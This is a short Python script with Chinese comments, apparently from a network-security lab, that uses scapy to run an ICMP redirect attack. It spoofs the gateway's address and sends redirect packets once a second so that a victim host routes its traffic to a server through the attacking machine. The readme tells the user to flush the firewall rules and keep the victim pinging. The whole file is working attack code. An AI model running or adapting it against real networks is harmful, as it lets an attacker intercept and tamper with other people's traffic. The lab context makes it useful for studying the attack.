#! /usr/bin/python
# -*- coding: utf-8 -*-
from scapy.all import *  # 导入scapy包
import time

# readme
"""
    使用前请务必确保：
    1、打开虚拟机的防火墙,否则将导致不同子网间无法ping通
    sudo iptables -F
    sudo iptables -L 查看防火墙规则,应该都为ACCEPT
    2、在受害机A中一直执行ping Server操作,否则无法实现
    3、在攻击机上运行本程序
"""


IP_A = '192.168.60.2'   # 受害机A的IP
IP_M = '192.168.60.1'   # 网关机的IP
IP_C = '192.168.60.5'   # 攻击机的IP
IP_Server = '10.0.2.7'  # 服务器的IP


ip = IP(src=IP_M, dst=IP_A) # 创建IP包
icmp = ICMP(type=5, code=1, gw=IP_C)    # 创建ICMP包，并设置类型为5，代码为1，网关为IP_C，redirect
ip2 = IP(src=IP_A, dst=IP_Server)   # 创建IP包

while True:
    send(ip/icmp/ip2/ICMP())    # 发送包
    time.sleep(1)   # 每秒发送一次
